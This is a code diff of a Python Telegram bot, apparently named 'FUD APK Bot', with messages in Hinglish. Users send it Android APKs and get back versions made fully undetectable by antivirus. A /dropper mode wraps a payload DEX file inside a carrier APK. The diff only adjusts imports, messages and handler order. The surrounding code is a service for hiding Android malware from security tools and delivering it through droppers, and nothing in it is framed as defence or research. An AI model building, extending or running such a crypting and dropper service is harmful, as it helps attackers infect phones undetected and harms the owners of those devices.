@@ -12,10 +12,10 @@ from telegram.ext import (
 )
 
 from config import BOT_TOKEN, WORK_DIR
-from __init__ import full_fud_pipeline, full_fud_pipeline_dropper, ensure_tools
+from pipeline import full_fud_pipeline, full_fud_pipeline_dropper, ensure_tools
 
 
-# ================= Flask (health check for Render/Railway) =================
+# ================= Flask (health check) =================
 flask_app = Flask(__name__)
 
 
@@ -33,9 +33,8 @@ def run_flask():
 async def handle_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🤖 *FUD APK Bot*\n\n"
-        "Modes:\n"
-        "• APK bhejo → FUD APK milega (obfuscated + signed)\n"
-        "• /dropper reply karke + DEX bhejo → dropper APK\n\n"
+        "• APK bhejo → FUD APK milega\n"
+        "• /dropper reply ke saath DEX bhejo → phir APK bhejo → dropper milega\n\n"
         "First run pe tools auto-download honge (2-5 min).",
         parse_mode="Markdown",
     )
@@ -54,7 +53,7 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     input_path = os.path.join(session_dir, "input.apk")
     output_path = os.path.join(session_dir, "fud_output.apk")
 
-    status = await msg.reply_text("⚙️ Processing shuru... (pehli baar tools download ho rahe hain, 2-5 min)")
+    status = await msg.reply_text("⚙️ Processing shuru... (pehli baar 2-5 min)")
 
     try:
         await status.edit_text("📥 APK download ho raha hai...")
@@ -82,13 +81,6 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def handle_dropper_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Reply to a previous /dropper request with an APK.
-    Flow:
-      1. User sends payload.dex with caption /dropper
-      2. Bot stores dex path in context.user_data
-      3. User sends carrier.apk → dropper built
-    """
     msg = update.message
     doc = msg.document if msg else None
     if not doc:
@@ -150,13 +142,12 @@ async def run_bot():
     app.add_handler(CommandHandler("start", handle_start))
     app.add_handler(CommandHandler("dropper", handle_dropper_apk))
     app.add_handler(MessageHandler(
-        filters.Document.FileExtension("apk") | filters.Document.FileExtension("dex"),
-        handle_dropper_apk if False else handle_apk,  # default = FUD only
-    ))
-    # Dropper path via /dropper command separately
-    app.add_handler(MessageHandler(
         filters.Document.ALL & filters.CaptionRegex(r"^/dropper"),
         handle_dropper_apk,
+    ))
+    app.add_handler(MessageHandler(
+        filters.Document.FileExtension("apk"),
+        handle_apk,
     ))
 
     await app.initialize()
@@ -173,7 +164,6 @@ async def run_bot():
 def main():
     os.makedirs(WORK_DIR, exist_ok=True)
 
-    # Background: kick off tool setup immediately at boot
     def _boot_setup():
         try:
             ensure_tools()
@@ -182,8 +172,6 @@ def main():
             traceback.print_exc()
 
     threading.Thread(target=_boot_setup, daemon=True).start()
-
-    # Flask for cloud health checks
     threading.Thread(target=run_flask, daemon=True).start()
     print("[✓] Flask started.")
 
